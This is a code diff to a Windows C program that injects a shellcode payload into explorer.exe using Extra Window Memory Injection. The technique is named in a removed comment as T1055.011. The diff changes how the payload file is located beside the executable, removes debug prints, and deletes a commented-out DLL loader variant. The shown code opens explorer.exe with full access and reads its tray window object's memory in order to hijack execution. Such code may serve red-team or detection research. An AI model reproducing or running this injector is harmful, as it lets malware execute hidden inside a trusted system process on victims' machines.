@@ -55,9 +55,6 @@ LPVOID ewm(LPVOID payload, DWORD payloadSize){
 
     // 2. Obtain a process id for explorer.exe
     GetWindowThreadProcessId(hw, &pid);
-    
-    //print pid
-    printf("find window ID=%d\n", pid);
 
     // 3. Open explorer.exe
     hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
@@ -70,8 +67,6 @@ LPVOID ewm(LPVOID payload, DWORD payloadSize){
         CloseHandle(hp);
         return;
     }
-    
-    printf("ctp: %p\n", ctp);
 
     // 5. Read address of the current CTray object
     ReadProcessMemory(hp, (LPVOID)ctp, (LPVOID)&ct.vTable, sizeof(ULONG_PTR), &wr);
@@ -120,39 +115,37 @@ LPVOID ewm(LPVOID payload, DWORD payloadSize){
     CloseHandle(hp);
 }
 
-// __declspec(dllexport) DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved );
-// __declspec(dllexport) DllMainCRTStartup(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved );
-
-// DllMainCRTStartup() {
-//   DllMain(GetModuleHandle(NULL), DLL_PROCESS_ATTACH, NULL);
-// }
 int main(void) {
-  // Reads payload.exeXX.bin from disk with ReadFile
-  // and loads it into memory
-  // LPVOID payload = NULL;
-  // DWORD  payloadSize = 0;
-  // #if defined(_WIN64)
-  //   HANDLE hFile = CreateFileA("payload.exe64.bin", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
-  // #else
-  //   HANDLE hFile = CreateFileA("payload.exe32.bin", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
-  // #endif
-  
-  // if(hFile != INVALID_HANDLE_VALUE) {
-  //   payloadSize = GetFileSize(hFile, NULL);
-  //   payload = VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    
-  //   if(payload != NULL) {
-  //     ReadFile(hFile, payload, payloadSize, &payloadSize, NULL);
-  //   }
-  //   CloseHandle(hFile);
-  // }
-
   LPVOID payload = NULL;
   DWORD  payloadSize = 0;
+
+  PVOID imageBase = GetModuleHandle(NULL);
+  char fullpath[MAX_PATH];
+  char drive[MAX_PATH];
+  char dir[MAX_PATH];
+	if (imageBase != NULL)
+	{
+        if (GetModuleFileName((HMODULE)imageBase, fullpath, sizeof(fullpath)) != 0)
+	    {
+            printf("This program is running from: %s\n", fullpath);
+	    }
+	}
+  
+  // Split fullpath into directory and filename
+  _splitpath_s(fullpath, drive, MAX_PATH, dir, MAX_PATH, NULL, 0, NULL, 0);
+
+  // Create fullpath to payload
   #if defined(_WIN64)
-    payloadSize = readpic("payload.exe64.bin", &payload);
+    sprintf_s(fullpath, MAX_PATH, "%s%s%s", drive, dir, "payload.exe_x64.bin");
   #else
-    payloadSize = readpic("payload.exe32.bin", &payload);
+    sprintf_s(fullpath, MAX_PATH, "%s%s%s", drive, dir, "payload.exe_x86.bin");
+  #endif
+  
+  // Read payload from disk
+  #if defined(_WIN64)
+    payloadSize = readpic(fullpath, &payload);
+  #else
+    payloadSize = readpic(fullpath, &payload);
   #endif
   if (payloadSize == 0) { printf("invalid payload\n"); return 0; }
 
@@ -161,46 +154,3 @@ int main(void) {
 
   return 0;
 }
-
-// BOOL WINAPI DllMain(
-//     HINSTANCE hinstDLL,  // handle to DLL module
-//     DWORD fdwReason,     // reason for calling function
-//     LPVOID lpvReserved )  // reserved
-// {
-//     switch( fdwReason ) 
-//     { 
-//         case DLL_PROCESS_ATTACH:
-//           // Reads payload.exeXX.bin from disk with ReadFile
-//           // and loads it into memory
-//           LPVOID payload = NULL;
-//           DWORD  payloadSize = 0;
-//           #if defined(_WIN64)
-//             HANDLE hFile = CreateFileA("payload.exe64.bin", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
-//           #else
-//             HANDLE hFile = CreateFileA("payload.exe32.bin", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
-//           #endif
-          
-//           if(hFile != INVALID_HANDLE_VALUE) {
-//             payloadSize = GetFileSize(hFile, NULL);
-//             payload = VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-            
-//             if(payload != NULL) {
-//               ReadFile(hFile, payload, payloadSize, &payloadSize, NULL);
-//             }
-//             CloseHandle(hFile);
-//           }
-
-//           // Executes payload usin Extra Window Memory Injection (T1055.011)
-//           ewm(payload, payloadSize);
-//           break;
-
-//         case DLL_THREAD_ATTACH:
-//         case DLL_THREAD_DETACH:
-//         case DLL_PROCESS_DETACH:
-//           break;
-//     }
-//     return TRUE;
-//     UNREFERENCED_PARAMETER(hinstDLL); 
-//     UNREFERENCED_PARAMETER(lpvReserved); 
-// }
-
